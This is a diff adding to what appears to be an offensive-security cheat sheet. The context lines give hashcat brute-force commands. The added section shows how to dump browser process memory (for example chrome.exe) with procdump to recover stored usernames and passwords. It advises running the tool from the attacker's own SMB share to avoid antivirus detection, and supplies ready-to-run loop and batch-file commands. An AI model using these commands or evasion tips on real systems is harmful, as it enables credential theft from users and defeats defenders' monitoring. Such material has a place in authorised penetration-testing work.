@@ -176,3 +176,18 @@ Brute (Old symbol define doesn't work anymore? Type it out manually instead.)
 - hashcat32.exe -a 3 -m <hash type> <hash_to_crack.txt> -1 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$* ?1?1?1?1?1?1?1?1 --session=NameOfSession
 - hashcat32.exe -a 3 -m <hash type> <hash_to_crack.txt> -1 uld ?1?1?1?1?1?1?1?1 --session=NameOfSession
 
+
+Process Dump (Requires local admin rights):
+NOTE: Best way to do this is to stand up an SMB share on your box, and host the procdump.exe there. Then call procdump.exe from the target machine when you have local admin rights. This will allow you to avoid installing it on the workstation and triggering an AV alert. Once you gather the dumps you need, you can search for cached usernames and passwords that the users chose to store in their browsers.
+
+To collect dump files of multiple processes with a given name:
+
+Navigate to the directory where procdump.exe is located.
+Execute:
+for /f "tokens=2 delims=," %F in ('tasklist /nh /fi "imagename eq <process>.exe" /fo csv') do procdump -ma %~F SP_%~F.dmp
+where <process> is the name of the process(es) you are collecting dumps of, for example chrome.exe
+
+Or create a batch file with this command:
+for /f "tokens=2 delims=," %%F in ('tasklist /nh /fi "imagename eq <process>.exe" /fo csv') do procdump -ma %%~F SP_%%~F.dmp
+where <process> is the name of the process(es) you are collecting dumps of, for example chrome.exe
+
